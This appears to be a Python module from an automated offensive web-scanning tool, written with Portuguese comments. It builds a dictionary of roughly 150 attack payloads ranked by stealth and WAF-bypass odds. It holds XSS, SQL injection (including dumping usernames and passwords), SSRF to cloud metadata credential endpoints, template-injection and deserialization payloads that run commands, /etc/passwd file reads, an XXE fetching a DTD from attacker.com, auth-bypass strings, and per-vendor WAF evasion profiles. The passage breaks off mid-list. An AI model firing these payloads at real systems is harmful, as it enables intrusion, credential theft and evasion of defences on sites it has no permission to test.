"""
MSE Payload Dictionary — Brutal Offensive Dictionary
========================================================
150+ payloads organizados por vetor, contexto tecnológico, nível de
furtividade e probabilidade de bypass WAF. Não substitui nenhum engine
existente — alimenta o Motor 11 (AutonomousConsolidator) com seleção
inteligente baseada em contexto real coletado pelos motores 1-10.
"""

from typing import List, Dict, Any, Optional
import random
import hashlib
import time


TECH_CONTEXT_MATRIX = {
    "react": ["xss_dom", "xss_dangerously", "prototype_pollution", "ssti_jsx"],
    "angular": ["xss_template_angular", "xss_csti", "prototype_pollution"],
    "vue": ["xss_template_vue", "xss_csti", "prototype_pollution"],
    "next.js": ["xss_dom", "ssrf_api_routes", "path_traversal_api", "ssti_jsx"],
    "nuxt.js": ["xss_template_vue", "ssrf_api_routes", "ssti_vue"],
    "express": ["prototype_pollution", "nosql_injection", "path_traversal", "ssti_ejs"],
    "django": ["ssti_jinja", "sqli_orm", "path_traversal", "debug_exposure"],
    "flask": ["ssti_jinja", "sqli_raw", "debug_exposure", "path_traversal"],
    "spring": ["ssti_thymeleaf", "sqli_hibernate", "rce_el", "deserialization"],
    "laravel": ["ssti_blade", "sqli_eloquent", "debug_exposure", "path_traversal"],
    "wordpress": ["xss_reflected", "sqli_wpdb", "path_traversal", "auth_bypass_wp"],
    "shopify": ["xss_liquid", "open_redirect", "api_key_exposure"],
    "php": ["sqli_raw", "lfi", "rce_eval", "file_upload", "xss_reflected"],
    "java": ["deserialization", "xxe", "sqli_hibernate", "ssti_thymeleaf"],
    "ruby": ["ssti_erb", "deserialization", "command_injection", "sqli_activerecord"],
    "asp.net": ["sqli_mssql", "path_traversal", "viewstate_deser", "xss_reflected"],
    "node.js": ["prototype_pollution", "nosql_injection", "ssrf", "command_injection"],
    "graphql": ["introspection", "sqli_graphql", "idor_graphql", "dos_query_depth"],
    "firebase": ["nosql_rules_bypass", "api_key_exposure", "idor_firebase"],
    "aws": ["ssrf_metadata", "s3_miscconfig", "iam_escalation", "lambda_injection"],
    "jquery": ["xss_jquery_dom", "xss_html_injection", "prototype_pollution"],
}

WAF_EVASION_PROFILES = {
    "cloudflare": {
        "techniques": ["double_url_encode", "unicode_normalize", "chunked_body", "case_variation"],
        "blocked_patterns": ["<script>", "alert(", "onerror=", "UNION SELECT"],
        "bypass_multiplier": 0.6,
    },
    "akamai": {
        "techniques": ["tab_injection", "null_byte", "overlong_utf8", "comment_injection"],
        "blocked_patterns": ["<script", "javascript:", "eval(", "fromCharCode"],
        "bypass_multiplier": 0.5,
    },
    "aws_waf": {
        "techniques": ["parameter_pollution", "json_injection", "method_override"],
        "blocked_patterns": ["<script>", "' OR ", "UNION", "../"],
        "bypass_multiplier": 0.65,
    },
    "imperva": {
        "techniques": ["unicode_normalize", "header_pollution", "multipart_abuse"],
        "blocked_patterns": ["<script", "eval(", "alert(", "document.cookie"],
        "bypass_multiplier": 0.55,
    },
    "modsecurity": {
        "techniques": ["case_swap", "comment_injection", "encoding_chain", "concat_split"],
        "blocked_patterns": ["<script>", "onerror", "onload", "UNION SELECT"],
        "bypass_multiplier": 0.7,
    },
    "unknown": {
        "techniques": ["double_url_encode", "case_variation", "null_byte"],
        "blocked_patterns": [],
        "bypass_multiplier": 0.8,
    },
    "none": {
        "techniques": [],
        "blocked_patterns": [],
        "bypass_multiplier": 1.0,
    },
}


class PayloadDictionary:

    def __init__(self):
        self.payloads = self._build_all_payloads()
        self.context_matrix = dict(TECH_CONTEXT_MATRIX)
        self.waf_profiles = dict(WAF_EVASION_PROFILES)
        self.execution_history: List[Dict] = []

    def _build_all_payloads(self) -> Dict[str, List[Dict]]:
        return {
            "xss_reflected": self._xss_reflected(),
            "xss_dom": self._xss_dom(),
            "xss_stored": self._xss_stored(),
            "xss_template_angular": self._xss_template_angular(),
            "xss_template_vue": self._xss_template_vue(),
            "xss_dangerously": self._xss_dangerously(),
            "xss_jquery_dom": self._xss_jquery_dom(),
            "xss_csti": self._xss_csti(),
            "xss_polyglot": self._xss_polyglot(),
            "xss_waf_bypass": self._xss_waf_bypass(),
            "sqli_raw": self._sqli_raw(),
            "sqli_blind": self._sqli_blind(),
            "sqli_union": self._sqli_union(),
            "sqli_error": self._sqli_error(),
            "ssrf": self._ssrf_payloads(),
            "ssrf_metadata": self._ssrf_metadata(),
            "ssti_jinja": self._ssti_jinja(),
            "ssti_ejs": self._ssti_ejs(),
            "ssti_thymeleaf": self._ssti_thymeleaf(),
            "lfi": self._lfi_payloads(),
            "rce": self._rce_payloads(),
            "nosql_injection": self._nosql_payloads(),
            "prototype_pollution": self._prototype_pollution(),
            "open_redirect": self._open_redirect(),
            "xxe": self._xxe_payloads(),
            "command_injection": self._command_injection(),
            "deserialization": self._deserialization(),
            "path_traversal": self._path_traversal(),
            "auth_bypass": self._auth_bypass(),
            "idor": self._idor_payloads(),
            "cors_exploit": self._cors_exploit(),
            "jwt_attack": self._jwt_attack(),
            "http_smuggling": self._http_smuggling(),
            "header_injection": self._header_injection(),
        }

    def _p(self, pid, payload, category, context, stealth, waf_bypass, severity="high", detection="reflection"):
        return {
            "id": pid,
            "payload": payload,
            "category": category,
            "context": context,
            "stealth_level": stealth,
            "waf_bypass_prob": waf_bypass,
            "severity": severity,
            "detection": detection,
            "base_weight": (stealth + waf_bypass) / 2,
            "success_count": 0,
            "fail_count": 0,
        }

    def _xss_reflected(self) -> List[Dict]:
        return [
            self._p("xr01", '<script>window.__MSE="{canary}"</script>', "xss_reflected", ["input", "url_param", "textarea"], 0.3, 0.2, "critical", "dom_variable"),
            self._p("xr02", '<img src=x onerror="window.__MSE=\'{canary}\'">', "xss_reflected", ["input", "url_param", "form"], 0.5, 0.5, "critical", "dom_variable"),
            self._p("xr03", '<svg/onload="window.__MSE=\'{canary}\'">', "xss_reflected", ["input", "url_param"], 0.5, 0.55, "critical", "dom_variable"),
            self._p("xr04", '<body/onload="window.__MSE=\'{canary}\'">', "xss_reflected", ["input", "url_param"], 0.45, 0.45, "critical", "dom_variable"),
            self._p("xr05", '<details/open/ontoggle="window.__MSE=\'{canary}\'">', "xss_reflected", ["input", "url_param"], 0.65, 0.7, "critical", "dom_variable"),
            self._p("xr06", '<marquee/onstart="window.__MSE=\'{canary}\'">', "xss_reflected", ["input", "url_param"], 0.6, 0.65, "high", "dom_variable"),
            self._p("xr07", '<video/src=x onerror="window.__MSE=\'{canary}\'">', "xss_reflected", ["input", "url_param"], 0.55, 0.6, "critical", "dom_variable"),
            self._p("xr08", '<input/onfocus="window.__MSE=\'{canary}\'" autofocus>', "xss_reflected", ["input", "form"], 0.6, 0.65, "critical", "dom_variable"),
            self._p("xr09", '<select/onfocus="window.__MSE=\'{canary}\'" autofocus>', "xss_reflected", ["input", "form"], 0.6, 0.65, "critical", "dom_variable"),
            self._p("xr10", '<isindex type=image src=x onerror="window.__MSE=\'{canary}\'">', "xss_reflected", ["input", "url_param"], 0.7, 0.7, "high", "dom_variable"),
            self._p("xr11", '"><script>window.__MSE="{canary}"</script>', "xss_reflected", ["input", "url_param", "form"], 0.3, 0.3, "critical", "dom_variable"),
            self._p("xr12", "'-window.__MSE='{canary}'-'", "xss_reflected", ["input", "url_param"], 0.7, 0.75, "high", "dom_variable"),
            self._p("xr13", '<math><mtext><table><mglyph><svg><mtext><textarea><path d="<img/src=x onerror=window.__MSE=\'{canary}\'>">', "xss_reflected", ["input"], 0.8, 0.85, "critical", "dom_variable"),
            self._p("xr14", '<a href="javascript:window.__MSE=\'{canary}\'">click</a>', "xss_reflected", ["input", "url_param"], 0.5, 0.5, "high", "dom_variable"),
        ]

    def _xss_dom(self) -> List[Dict]:
        return [
            self._p("xd01", 'javascript:window.__MSE="{canary}"', "xss_dom", ["href", "src", "location", "hash"], 0.6, 0.5, "critical", "dom_variable"),
            self._p("xd02", '#"><script>window.__MSE="{canary}"</script>', "xss_dom", ["hash", "fragment"], 0.5, 0.6, "critical", "dom_variable"),
            self._p("xd03", 'data:text/html,<script>window.__MSE="{canary}"</script>', "xss_dom", ["iframe", "object", "src"], 0.5, 0.5, "critical", "dom_variable"),
            self._p("xd04", '"><img src=x onerror="window.__MSE=\'{canary}\'">', "xss_dom", ["innerHTML", "outerHTML"], 0.4, 0.4, "critical", "dom_variable"),
            self._p("xd05", '\\x3cscript\\x3ewindow.__MSE="{canary}"\\x3c/script\\x3e', "xss_dom", ["innerHTML", "json_parse"], 0.75, 0.7, "critical", "dom_variable"),
            self._p("xd06", 'javascript:void(window.__MSE="{canary}")', "xss_dom", ["href", "location"], 0.55, 0.5, "critical", "dom_variable"),
            self._p("xd07", '"-window.__MSE="{canary}"-"', "xss_dom", ["eval", "setTimeout", "Function"], 0.7, 0.65, "critical", "dom_variable"),
        ]

    def _xss_stored(self) -> List[Dict]:
        return [
            self._p("xs01", '<img src=x onerror="window.__MSE=\'{canary}\'">', "xss_stored", ["textarea", "comment", "profile", "message"], 0.4, 0.5, "critical", "dom_variable"),
            self._p("xs02", '<svg/onload="window.__MSE=\'{canary}\'">', "xss_stored", ["textarea", "comment", "profile"], 0.5, 0.55, "critical", "dom_variable"),
            self._p("xs03", '<details open ontoggle="window.__MSE=\'{canary}\'">', "xss_stored", ["textarea", "comment"], 0.65, 0.7, "critical", "dom_variable"),
            self._p("xs04", '<div style="background:url(javascript:window.__MSE=\'{canary}\')">', "xss_stored", ["textarea", "profile", "bio"], 0.6, 0.65, "high", "dom_variable"),
        ]

    def _xss_template_angular(self) -> List[Dict]:
        return [
            self._p("xa01", "{{constructor.constructor('window.__MSE=\"{canary}\"')()}}", "xss_template", ["input", "url_param", "angular"], 0.7, 0.75, "critical", "dom_variable"),
            self._p("xa02", "{{$on.constructor('window.__MSE=\"{canary}\"')()}}", "xss_template", ["input", "angular"], 0.75, 0.8, "critical", "dom_variable"),
            self._p("xa03", "{{a]constructor.prototype.b]constructor('window.__MSE=\"{canary}\"')()}}", "xss_template", ["input", "angular"], 0.8, 0.85, "critical", "dom_variable"),
            self._p("xa04", "{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(119,105,110,100,111,119,46,95,95,77,83,69,61,39,123,99,97,110,97,114,121,125,39))()}}", "xss_template", ["angular"], 0.9, 0.9, "critical", "dom_variable"),
        ]

    def _xss_template_vue(self) -> List[Dict]:
        return [
            self._p("xv01", "{{_c.constructor('window.__MSE=\"{canary}\"')()}}", "xss_template", ["input", "vue"], 0.7, 0.75, "critical", "dom_variable"),
            self._p("xv02", "{{this.constructor.constructor('window.__MSE=\"{canary}\"')()}}", "xss_template", ["input", "vue"], 0.7, 0.75, "critical", "dom_variable"),
            self._p("xv03", 'v-bind:href="javascript:window.__MSE=\'{canary}\'"', "xss_template", ["vue"], 0.65, 0.7, "critical", "dom_variable"),
        ]

    def _xss_dangerously(self) -> List[Dict]:
        return [
            self._p("xdr01", '{"__html":"<img src=x onerror=window.__MSE=\'{canary}\'>"}', "xss_dangerously", ["react", "dangerouslySetInnerHTML"], 0.6, 0.55, "critical", "dom_variable"),
            self._p("xdr02", '<img src=x onerror="window.__MSE=\'{canary}\'">', "xss_dangerously", ["react", "innerHTML"], 0.5, 0.5, "critical", "dom_variable"),
        ]

    def _xss_jquery_dom(self) -> List[Dict]:
        return [
            self._p("xjq01", '<img src=x onerror="window.__MSE=\'{canary}\'">', "xss_jquery", ["jquery", ".html()", ".append()"], 0.5, 0.5, "critical", "dom_variable"),
            self._p("xjq02", '<svg/onload="window.__MSE=\'{canary}\'">', "xss_jquery", ["jquery", ".prepend()", ".after()"], 0.55, 0.55, "critical", "dom_variable"),
            self._p("xjq03", '"><img src=x onerror="window.__MSE=\'{canary}\'">', "xss_jquery", ["jquery", "$()", "selector_injection"], 0.5, 0.5, "critical", "dom_variable"),
        ]

    def _xss_csti(self) -> List[Dict]:
        return [
            self._p("xc01", "${7*7}", "xss_csti", ["template_literal", "es6"], 0.6, 0.65, "high", "regex:49"),
            self._p("xc02", "{{7*7}}", "xss_csti", ["angular", "vue", "jinja", "twig"], 0.5, 0.55, "high", "regex:49"),
            self._p("xc03", "#{7*7}", "xss_csti", ["ruby", "erb", "pug"], 0.55, 0.6, "high", "regex:49"),
            self._p("xc04", "<%= 7*7 %>", "xss_csti", ["ejs", "erb"], 0.5, 0.5, "high", "regex:49"),
            self._p("xc05", "${7*'7'}", "xss_csti", ["freemarker"], 0.55, 0.6, "high", "regex:49"),
        ]

    def _xss_polyglot(self) -> List[Dict]:
        return [
            self._p("xp01", "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=window.__MSE='{canary}' )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=window.__MSE='{canary}'//>\\x3e", "xss_polyglot", ["input", "url_param", "textarea", "universal"], 0.85, 0.9, "critical", "dom_variable"),
            self._p("xp02", "';window.__MSE='{canary}'//\\';window.__MSE='{canary}'//\";window.__MSE='{canary}'//\\\";\nwindow.__MSE='{canary}'//--></SCRIPT>\">'><SCRIPT>window.__MSE='{canary}'</SCRIPT>=&{{7*7}}", "xss_polyglot", ["input", "url_param", "universal"], 0.8, 0.85, "critical", "dom_variable"),
            self._p("xp03", "<svg/onload=\"window.__MSE='{canary}'\"><!--", "xss_polyglot", ["input", "url_param"], 0.65, 0.7, "critical", "dom_variable"),
        ]

    def _xss_waf_bypass(self) -> List[Dict]:
        return [
            self._p("xw01", '<sVg/oNloAd="window.__MSE=\'{canary}\'">', "xss_waf_bypass", ["input", "url_param"], 0.7, 0.8, "critical", "dom_variable"),
            self._p("xw02", '<img src=x oNeRrOr="window.__MSE=\'{canary}\'">', "xss_waf_bypass", ["input", "url_param"], 0.65, 0.75, "critical", "dom_variable"),
            self._p("xw03", '%3Csvg%2Fonload%3D"window.__MSE%3D\'{canary}\'">', "xss_waf_bypass", ["url_param"], 0.75, 0.85, "critical", "dom_variable"),
            self._p("xw04", '<svg\x09onload\x0d="window.__MSE=\'{canary}\'">', "xss_waf_bypass", ["input"], 0.8, 0.85, "critical", "dom_variable"),
            self._p("xw05", '<svg/onload="win\u0064ow.__MSE=\'{canary}\'">', "xss_waf_bypass", ["input", "url_param"], 0.8, 0.85, "critical", "dom_variable"),
            self._p("xw06", '<<sCrIpT>window.__MSE="{canary}"<</sCrIpT>>', "xss_waf_bypass", ["input"], 0.75, 0.8, "critical", "dom_variable"),
            self._p("xw07", '<svg><script>window.__MSE="{canary}"</script></svg>', "xss_waf_bypass", ["input", "url_param"], 0.65, 0.7, "critical", "dom_variable"),
            self._p("xw08", '<object data="data:text/html,<script>window.__MSE=\'{canary}\'</script>">', "xss_waf_bypass", ["input"], 0.7, 0.75, "critical", "dom_variable"),
            self._p("xw09", '<!--><svg/onload="window.__MSE=\'{canary}\'">', "xss_waf_bypass", ["input", "url_param"], 0.75, 0.8, "critical", "dom_variable"),
            self._p("xw10", "<scr\x00ipt>window.__MSE='{canary}'</scr\x00ipt>", "xss_waf_bypass", ["input"], 0.85, 0.9, "critical", "dom_variable"),
        ]

    def _sqli_raw(self) -> List[Dict]:
        return [
            self._p("sq01", "' OR '1'='1", "sqli_raw", ["login", "search", "id_param"], 0.3, 0.3, "critical", "error_based"),
            self._p("sq02", "\" OR \"1\"=\"1", "sqli_raw", ["login", "search"], 0.3, 0.3, "critical", "error_based"),
            self._p("sq03", "' OR '1'='1' --", "sqli_raw", ["login", "search", "id_param"], 0.3, 0.25, "critical", "error_based"),
            self._p("sq04", "1' AND '1'='1", "sqli_raw", ["id_param", "numeric"], 0.4, 0.4, "high", "boolean_based"),
            self._p("sq05", "1' AND SLEEP(3)--", "sqli_raw", ["id_param", "search"], 0.5, 0.5, "critical", "time_based"),
            self._p("sq06", "admin'--", "sqli_raw", ["login"], 0.35, 0.3, "critical", "auth_bypass"),
            self._p("sq07", "1; WAITFOR DELAY '0:0:3'--", "sqli_raw", ["id_param", "mssql"], 0.5, 0.5, "critical", "time_based"),
            self._p("sq08", "' AND 1=CONVERT(int,(SELECT @@version))--", "sqli_raw", ["id_param", "mssql"], 0.5, 0.45, "critical", "error_based"),
        ]

    def _sqli_blind(self) -> List[Dict]:
        return [
            self._p("sqb01", "' AND SUBSTRING(version(),1,1)='5", "sqli_blind", ["id_param", "search"], 0.6, 0.6, "critical", "boolean_based"),
            self._p("sqb02", "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "sqli_blind", ["id_param"], 0.5, 0.5, "critical", "boolean_based"),
            self._p("sqb03", "1' AND IF(1=1,SLEEP(3),0)--", "sqli_blind", ["id_param", "search"], 0.6, 0.6, "critical", "time_based"),
            self._p("sqb04", "1' AND BENCHMARK(5000000,MD5('test'))--", "sqli_blind", ["id_param"], 0.65, 0.6, "critical", "time_based"),
            self._p("sqb05", "1; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--", "sqli_blind", ["id_param", "postgres"], 0.6, 0.55, "critical", "time_based"),
        ]

    def _sqli_union(self) -> List[Dict]:
        return [
            self._p("squ01", "' UNION SELECT NULL--", "sqli_union", ["id_param", "numeric"], 0.4, 0.35, "critical", "union_based"),
            self._p("squ02", "' UNION SELECT NULL,NULL--", "sqli_union", ["id_param"], 0.4, 0.35, "critical", "union_based"),
            self._p("squ03", "' UNION SELECT NULL,NULL,NULL--", "sqli_union", ["id_param"], 0.4, 0.35, "critical", "union_based"),
            self._p("squ04", "' UNION SELECT username,password FROM users--", "sqli_union", ["id_param"], 0.35, 0.3, "critical", "union_based"),
            self._p("squ05", "0 UNION/**/ SELECT 1,2,3,4,5,6--", "sqli_union", ["id_param", "numeric"], 0.55, 0.6, "critical", "union_based"),
        ]

    def _sqli_error(self) -> List[Dict]:
        return [
            self._p("sqe01", "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "sqli_error", ["id_param"], 0.6, 0.55, "critical", "error_based"),
            self._p("sqe02", "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--", "sqli_error", ["id_param"], 0.6, 0.55, "critical", "error_based"),
            self._p("sqe03", "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "sqli_error", ["id_param"], 0.55, 0.5, "critical", "error_based"),
        ]

    def _ssrf_payloads(self) -> List[Dict]:
        return [
            self._p("ss01", "http://127.0.0.1", "ssrf", ["url_param", "redirect", "webhook"], 0.4, 0.4, "high", "ssrf_response"),
            self._p("ss02", "http://0.0.0.0", "ssrf", ["url_param", "redirect"], 0.5, 0.5, "high", "ssrf_response"),
            self._p("ss03", "http://0x7f000001", "ssrf", ["url_param"], 0.7, 0.7, "high", "ssrf_response"),
            self._p("ss04", "http://[::1]", "ssrf", ["url_param"], 0.6, 0.6, "high", "ssrf_response"),
            self._p("ss05", "http://localtest.me", "ssrf", ["url_param", "redirect"], 0.65, 0.65, "high", "ssrf_response"),
            self._p("ss06", "http://2130706433", "ssrf", ["url_param"], 0.7, 0.7, "high", "ssrf_response"),
            self._p("ss07", "gopher://127.0.0.1:6379/_PING", "ssrf", ["url_param"], 0.55, 0.5, "critical", "ssrf_response"),
        ]

    def _ssrf_metadata(self) -> List[Dict]:
        return [
            self._p("sm01", "http://169.254.169.254/latest/meta-data/", "ssrf_metadata", ["url_param", "aws"], 0.5, 0.5, "critical", "aws_metadata"),
            self._p("sm02", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "ssrf_metadata", ["url_param", "aws"], 0.5, 0.5, "critical", "aws_credentials"),
            self._p("sm03", "http://metadata.google.internal/computeMetadata/v1/", "ssrf_metadata", ["url_param", "gcp"], 0.5, 0.5, "critical", "gcp_metadata"),
            self._p("sm04", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "ssrf_metadata", ["url_param", "azure"], 0.5, 0.5, "critical", "azure_metadata"),
        ]

    def _ssti_jinja(self) -> List[Dict]:
        return [
            self._p("tj01", "{{7*7}}", "ssti_jinja", ["input", "url_param", "form"], 0.5, 0.55, "critical", "regex:49"),
            self._p("tj02", "{{config}}", "ssti_jinja", ["input", "url_param"], 0.5, 0.5, "critical", "regex:config"),
            self._p("tj03", "{{''.__class__.__mro__[2].__subclasses__()}}", "ssti_jinja", ["input", "url_param"], 0.6, 0.55, "critical", "regex:subprocess"),
            self._p("tj04", "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "ssti_jinja", ["input"], 0.65, 0.6, "critical", "rce_confirm"),
            self._p("tj05", "{{lipsum.__globals__.os.popen('id').read()}}", "ssti_jinja", ["input"], 0.7, 0.65, "critical", "rce_confirm"),
        ]

    def _ssti_ejs(self) -> List[Dict]:
        return [
            self._p("te01", "<%= 7*7 %>", "ssti_ejs", ["input", "url_param", "express"], 0.5, 0.5, "critical", "regex:49"),
            self._p("te02", "<%= process.env %>", "ssti_ejs", ["input", "express"], 0.55, 0.5, "critical", "regex:env"),
            self._p("te03", "<%- include('/etc/passwd') %>", "ssti_ejs", ["input", "express"], 0.6, 0.55, "critical", "regex:root"),
        ]

    def _ssti_thymeleaf(self) -> List[Dict]:
        return [
            self._p("tt01", "__${7*7}__", "ssti_thymeleaf", ["input", "url_param", "spring", "java"], 0.55, 0.55, "critical", "regex:49"),
            self._p("tt02", "__${T(java.lang.Runtime).getRuntime().exec('id')}__", "ssti_thymeleaf", ["input", "spring"], 0.6, 0.55, "critical", "rce_confirm"),
        ]

    def _lfi_payloads(self) -> List[Dict]:
        return [
            self._p("lf01", "../../../etc/passwd", "lfi", ["path", "file_param", "template"], 0.4, 0.4, "critical", "regex:root:"),
            self._p("lf02", "....//....//....//etc/passwd", "lfi", ["path", "file_param"], 0.6, 0.65, "critical", "regex:root:"),
            self._p("lf03", "..%252f..%252f..%252fetc/passwd", "lfi", ["path", "file_param"], 0.7, 0.75, "critical", "regex:root:"),
            self._p("lf04", "/proc/self/environ", "lfi", ["path", "file_param"], 0.5, 0.5, "critical", "env_leak"),
            self._p("lf05", "php://filter/convert.base64-encode/resource=index.php", "lfi", ["file_param", "php"], 0.55, 0.5, "critical", "base64_source"),
            self._p("lf06", "..\\..\\..\\windows\\win.ini", "lfi", ["path", "file_param", "windows"], 0.5, 0.5, "critical", "regex:fonts"),
        ]

    def _rce_payloads(self) -> List[Dict]:
        return [
            self._p("rc01", ";id", "rce", ["cmd_param", "exec"], 0.3, 0.25, "critical", "regex:uid="),
            self._p("rc02", "|id", "rce", ["cmd_param", "exec"], 0.3, 0.25, "critical", "regex:uid="),
            self._p("rc03", "$(id)", "rce", ["cmd_param", "exec"], 0.4, 0.4, "critical", "regex:uid="),
            self._p("rc04", "`id`", "rce", ["cmd_param", "exec"], 0.45, 0.4, "critical", "regex:uid="),
            self._p("rc05", ";ping -c 3 127.0.0.1", "rce", ["cmd_param"], 0.4, 0.4, "critical", "time_based"),
        ]

    def _nosql_payloads(self) -> List[Dict]:
        return [
            self._p("ns01", '{"$gt":""}', "nosql_injection", ["json_body", "mongo", "login"], 0.5, 0.6, "critical", "auth_bypass"),
            self._p("ns02", '{"$ne":"invalid"}', "nosql_injection", ["json_body", "mongo"], 0.5, 0.6, "critical", "data_leak"),
            self._p("ns03", '{"$regex":".*"}', "nosql_injection", ["json_body", "mongo", "search"], 0.55, 0.6, "high", "data_leak"),
            self._p("ns04", '{"$where":"this.password.match(/.*/)"}', "nosql_injection", ["json_body", "mongo"], 0.6, 0.55, "critical", "data_leak"),
            self._p("ns05", "[$ne]=1", "nosql_injection", ["url_param", "form", "mongo"], 0.55, 0.6, "critical", "auth_bypass"),
        ]

    def _prototype_pollution(self) -> List[Dict]:
        return [
            self._p("pp01", '{"__proto__":{"isAdmin":true}}', "prototype_pollution", ["json_body", "node.js", "express"], 0.5, 0.6, "critical", "privilege_escalation"),
            self._p("pp02", '{"constructor":{"prototype":{"isAdmin":true}}}', "prototype_pollution", ["json_body", "node.js"], 0.55, 0.6, "critical", "privilege_escalation"),
            self._p("pp03", "__proto__[isAdmin]=true", "prototype_pollution", ["url_param", "form", "node.js"], 0.5, 0.55, "critical", "privilege_escalation"),
            self._p("pp04", '{"__proto__":{"status":200}}', "prototype_pollution", ["json_body", "node.js"], 0.55, 0.6, "high", "behavior_change"),
        ]

    def _open_redirect(self) -> List[Dict]:
        return [
            self._p("or01", "https://evil.com", "open_redirect", ["redirect", "url_param", "next", "return_url"], 0.4, 0.4, "medium", "redirect_check"),
            self._p("or02", "//evil.com", "open_redirect", ["redirect", "url_param"], 0.55, 0.55, "medium", "redirect_check"),
            self._p("or03", "/\\evil.com", "open_redirect", ["redirect", "url_param"], 0.65, 0.65, "medium", "redirect_check"),
            self._p("or04", "https:evil.com", "open_redirect", ["redirect", "url_param"], 0.7, 0.7, "medium", "redirect_check"),
            self._p("or05", "%0d%0aLocation:https://evil.com", "open_redirect", ["url_param", "header"], 0.75, 0.8, "high", "header_injection"),
        ]

    def _xxe_payloads(self) -> List[Dict]:
        return [
            self._p("xx01", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "xxe", ["xml_body", "upload"], 0.4, 0.4, "critical", "regex:root:"),
            self._p("xx02", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', "xxe", ["xml_body", "upload", "aws"], 0.5, 0.5, "critical", "ssrf_response"),
            self._p("xx03", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>', "xxe", ["xml_body"], 0.55, 0.5, "critical", "oob_callback"),
        ]

    def _command_injection(self) -> List[Dict]:
        return [
            self._p("ci01", ";echo MSE_CMD_{canary}", "command_injection", ["cmd_param", "exec", "system"], 0.35, 0.3, "critical", "regex:MSE_CMD_"),
            self._p("ci02", "|echo MSE_CMD_{canary}", "command_injection", ["cmd_param", "exec"], 0.35, 0.3, "critical", "regex:MSE_CMD_"),
            self._p("ci03", "$(echo MSE_CMD_{canary})", "command_injection", ["cmd_param"], 0.45, 0.45, "critical", "regex:MSE_CMD_"),
            self._p("ci04", "`echo MSE_CMD_{canary}`", "command_injection", ["cmd_param"], 0.5, 0.45, "critical", "regex:MSE_CMD_"),
            self._p("ci05", "${IFS}echo${IFS}MSE_CMD_{canary}", "command_injection", ["cmd_param"], 0.7, 0.7, "critical", "regex:MSE_CMD_"),
        ]

    def _deserialization(self) -> List[Dict]:
        return [
            self._p("ds01", 'O:8:"stdClass":1:{s:4:"test";s:4:"MSE_";}', "deserialization", ["cookie", "session", "php"], 0.5, 0.5, "critical", "behavior_change"),
            self._p("ds02", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "deserialization", ["cookie", "session", "java"], 0.5, 0.5, "critical", "behavior_change"),
            self._p("ds03", '{"rce":"_$$ND_FUNC$$_function(){return require(\"child_process\").execSync(\"id\")}()"}', "deserialization", ["json_body", "node.js"], 0.55, 0.5, "critical", "rce_confirm"),
        ]

    def _path_traversal(self) -> List[Dict]:
        return [
            self._p("pt01", "/../../../etc/passwd", "path_traversal", ["path", "api_route"], 0.4, 0.35, "critical", "regex:root:"),
            self._p("pt02", "/..%252f..%252f..%252fetc/passwd", "path_traversal", ["path", "api_route"], 0.65, 0.7, "critical", "regex:root:"),
            self._p("pt03", "/.%00./etc/passwd", "path_traversal", ["path"], 0.7, 0.7, "critical", "regex:root:"),
            self._p("pt04", "/..;/..;/..;/etc/passwd", "path_traversal", ["path", "java", "spring"], 0.6, 0.65, "critical", "regex:root:"),
        ]

    def _auth_bypass(self) -> List[Dict]:
        return [
            self._p("ab01", '{"username":"admin","password":{"$gt":""}}', "auth_bypass", ["login", "json_body", "mongo"], 0.5, 0.55, "critical", "auth_bypass"),
            self._p("ab02", "admin' OR '1'='1'--", "auth_bypass", ["login", "form"], 0.3, 0.25, "critical", "auth_bypass"),
            self._p("ab03", '{"username":"admin","password":"admin"}', "auth_bypass", ["login", "json_body"], 0.3, 0.3, "high", "auth_bypass"),
            self._p("ab04", "X-Original-URL: /admin", "auth_bypass", ["header", "path_override"], 0.65, 0.7, "critical", "access_control"),
            self._p("ab05", "X-Forwarded-For: 127.0.0.1", "auth_bypass", ["header", "ip_whitelist"], 0.5, 0.55, "high", "access_control"),
        ]

    def _idor_payloads(self) -> List[Dict]:
        return [
            self._p("id01", "1", "idor", ["id_param", "user_id", "order_id"], 0.3, 0.4, "high", "data_leak"),
            self._p("id02", "0", "idor", ["id_param", "user_id"], 0.3, 0.4, "high", "data_leak"),
            self._p("id03", "-1", "idor", ["id_param"], 0.35, 0.4, "high", "error_based"),
            self._p("id04", "9999999", "idor", ["id_param", "user_id"], 0.3, 0.4, "high", "data_leak"),
        ]

    def _cors_exploit(self) -> List[Dict]:
        return [
            self._p("co01", "Origin: https://evil.com", "cors_exploit", ["header"], 0.4, 0.5, "high", "header_reflection"),
            self._p("co02", "Origin: null", "cors_exploit", ["header"], 0.5, 0.55, "high", "header_reflection"),
            self._p("co03", "Origin: https://target.com.evil.com", "cors_exploit", ["header"], 0.55, 0.6, "high", "header_reflection"),
        ]

    def _jwt_attack(self) -> List[Dict]:
        return [
            self._p("jw01", '{"alg":"none"}', "jwt_attack", ["auth_header", "cookie", "jwt"], 0.5, 0.5, "critical", "auth_bypass"),
            self._p("jw02", '{"alg":"HS256","kid":"../../etc/passwd"}', "jwt_attack", ["auth_header", "jwt"], 0.6, 0.6, "critical", "lfi"),
            self._p("jw03", '{"alg":"HS256"}', "jwt_attack", ["auth_header", "jwt"], 0.45, 0.45, "critical", "key_confusion"),
        ]

    def _http_smuggling(self) -> List[Dict]:
        return [
